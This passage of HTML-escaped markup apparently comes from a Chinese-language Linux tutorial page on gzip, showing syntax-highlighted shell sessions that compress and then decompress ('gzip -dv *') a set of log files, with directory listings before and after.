class=&quot;crayon-v&quot;&gt;log2015&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b63410432658-14&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b63410432658-15&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;       &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2016&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b63410432658-16&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b63410432658-17&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;       &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2017&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b63410432658-18&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b63410432658-19&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# gzip *&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b63410432658-20&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b63410432658-21&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# ll&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b63410432658-22&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b63410432658-23&quot;&gt;总计 &lt;span class=&quot;crayon-cn&quot;&gt;28&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b63410432658-24&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b63410432658-25&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;1341&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;linklog&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b63410432658-26&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b63410432658-27&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1341&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2012&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b63410432658-28&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b63410432658-29&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;70&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b63410432658-30&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b63410432658-31&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2014&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b63410432658-32&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b63410432658-33&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2015&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b63410432658-34&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b63410432658-35&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2016&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b63410432658-36&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b63410432658-37&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2017&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b63410432658-38&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b63410432658-39&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;#&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0074 seconds] --&gt;
&lt;p&gt;说明：&lt;/p&gt;
&lt;p&gt;实例2：把例1中每个压缩的文件解压，并列出详细的信息&lt;/p&gt;
&lt;p&gt;命令：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b12c9a9b67356175556&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
gzip -dv *&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b67356175556-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b67356175556-1&quot;&gt;
&lt;span class=&quot;crayon-i&quot;&gt;gzip&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;dv&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0004 seconds] --&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b12c9a9b6a359730931&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
[root@localhost test6]# ll

总计 28

---xr--r-- 1 root mail  1341 11-30 08:39 linklog.log.gz

---xr--r-- 1 mail users 1341 11-30 08:39 log2012.log.gz

-rw-r--r-- 1 mail users   70 11-30 08:39 log2013.log.gz

-rw-r--r-- 1 root mail    32 11-30 08:39 log2014.log.gz

-rw-r--r-- 1 root mail    32 11-30 08:39 log2015.log.gz

-rw-r--r-- 1 root mail    32 11-30 08:39 log2016.log.gz

-rw-r--r-- 1 root mail    32 11-30 08:39 log2017.log.gz

[root@localhost test6]# gzip -dv *

linklog.log.gz:  99.6% -- replaced with linklog.log

log2012.log.gz:  99.6% -- replaced with log2012.log

log2013.log.gz:  47.5% -- replaced with log2013.log

log2014.log.gz:   0.0% -- replaced with log2014.log

log2015.log.gz:   0.0% -- replaced with log2015.log

log2016.log.gz:   0.0% -- replaced with log2016.log

log2017.log.gz:   0.0% -- replaced with log2017.log

[root@localhost test6]# ll

总计 604

---xr--r-- 1 root mail  302108 11-30 08:39 linklog.log

---xr--r-- 1 mail users 302108 11-30 08:39 log2012.log

-rw-r--r-- 1 mail users     61 11-30 08:39 log2013.log

-rw-r--r-- 1 root mail       0 11-30 08:39 log2014.log

-rw-r--r-- 1 root mail       0 11-30 08:39 log2015.log

-rw-r--r-- 1 root mail       0 11-30 08:39 log2016.log

-rw-r--r-- 1 root mail       0 11-30 08:39 log2017.log

[root@localhost test6]#&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-22&quot;&gt;22&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-23&quot;&gt;23&lt;/div&gt;
